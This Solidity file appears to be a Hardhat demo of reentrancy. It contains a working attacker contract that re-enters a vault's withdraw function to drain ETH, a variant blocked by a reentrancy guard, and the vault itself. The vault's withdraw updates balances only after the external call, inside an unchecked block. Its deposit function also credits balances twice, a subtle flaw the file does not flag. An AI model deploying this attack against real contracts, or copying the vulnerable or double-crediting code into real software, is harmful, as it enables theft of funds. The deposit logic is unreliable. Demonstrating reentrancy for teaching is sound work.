// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "hardhat/console.sol";

interface IVulnerableContract {
    function withdrawWithVulnerability(
        address _receiver,
        address _token,
        uint _amount
    ) external;

    function withdrawWithReentrancyGaurd(
        address _receiver,
        address _token,
        uint _amount
    ) external;
}

contract MaliciousReentrancy {
    IVulnerableContract public target;
    address public token;
    address public owner;

    constructor(address _target, address _token) {
        target = IVulnerableContract(_target);
        token = _token;
        owner = msg.sender;
    }

    receive() external payable {
        // Ignore transfers from the owner or when the target balance reaches zero
        console.log("Target balance: ", address(target).balance);
        if (msg.sender == owner || address(target).balance == 0) {
            return;
        }

        console.log("Executing reentrancy attack");
        target.withdrawWithVulnerability(address(this), token, 1 ether);
    }

    function depositToTarget() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = address(target).call{value: address(this).balance}(
            ""
        );
        require(success, "ETH transfer failed");
    }

    function attack() external {
        require(msg.sender == owner, "Not owner");

        // Trigger the attack
        target.withdrawWithVulnerability(
            address(this),
            address(token),
            1 ether
        );
    }
}

contract MaliciousReentrancyBlocked {
    IVulnerableContract public target;
    address public token;
    address public owner;

    constructor(address _target, address _token) {
        target = IVulnerableContract(_target);
        token = _token;
        owner = msg.sender;
    }

    receive() external payable {
        // Ignore transfers from the owner or when the target balance reaches zero
        if (msg.sender == owner || address(target).balance == 0) {
            return;
        }

        console.log("Executing reentrancy attack");
        target.withdrawWithReentrancyGaurd(address(this), token, 1 ether);
    }

    function depositToTarget() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = address(target).call{value: address(this).balance}(
            ""
        );
        require(success, "ETH transfer failed");
    }

    function attack() external {
        require(msg.sender == owner, "Not owner");

        // Trigger the attack
        target.withdrawWithReentrancyGaurd(
            address(this),
            address(token),
            1 ether
        );
    }
}

/** Contract uses the zero address to indicate transfers in native ETH. */
contract ReentrancyGuardedContract is AccessControl, Pausable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    event Deposit(address indexed account, address indexed token, uint amount);
    event Withdraw(address indexed account, address indexed token, uint amount);

    error ETHTransferFailed();
    error InsufficientBalance();

    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");

    mapping(address account => mapping(address token => uint balance))
        private balances;

    constructor(address _pauser) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(PAUSER_ROLE, _pauser);
    }

    // Functions to handle incoming Ether
    fallback() external payable {
        _handleNativeETHDeposit();
    }

    receive() external payable {
        _handleNativeETHDeposit();
    }

    function deposit(address _token, uint _amount) external whenNotPaused {
        if (_token != address(0)) {
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            balances[msg.sender][_token] += _amount;
        } else {
            _handleNativeETHDeposit();
        }

        emit Deposit(msg.sender, _token, _amount);

        unchecked {
            balances[msg.sender][_token] += _amount;
        }
    }

    function _handleNativeETHDeposit() internal {
        balances[msg.sender][address(0)] += msg.value;
    }

    function withdrawWithVulnerability(
        address _receiver,
        address _token,
        uint _amount
    ) external whenNotPaused {
        if (balances[msg.sender][_token] < _amount)
            revert InsufficientBalance();

        if (_token != address(0)) {
            IERC20(_token).safeTransfer(_receiver, _amount);
        } else {
            (bool success, ) = _receiver.call{value: _amount}("");
            require(success, ETHTransferFailed());
        }

        unchecked {
            balances[msg.sender][_token] -= _amount;
        }

        emit Withdraw(msg.sender, _token, _amount);
    }

    function withdrawWithReentrancyGaurd(
        address _receiver,
        address _token,
        uint _amount
    ) external nonReentrant whenNotPaused {
        if (balances[msg.sender][_token] < _amount)
            revert InsufficientBalance();

        if (_token != address(0)) {
            IERC20(_token).safeTransfer(_receiver, _amount);
        } else {
            (bool success, ) = _receiver.call{value: _amount}("");
            require(success, ETHTransferFailed());
        }

        unchecked {
            balances[msg.sender][_token] -= _amount;
        }

        emit Withdraw(msg.sender, _token, _amount);
    }

    function pause() external onlyRole(PAUSER_ROLE) {
        _pause();
    }

    function unpause() external onlyRole(PAUSER_ROLE) {
        _unpause();
    }

    function getBalance(
        address _account,
        address _token
    ) external view returns (uint balance) {
        balance = balances[_account][_token];
    }
}
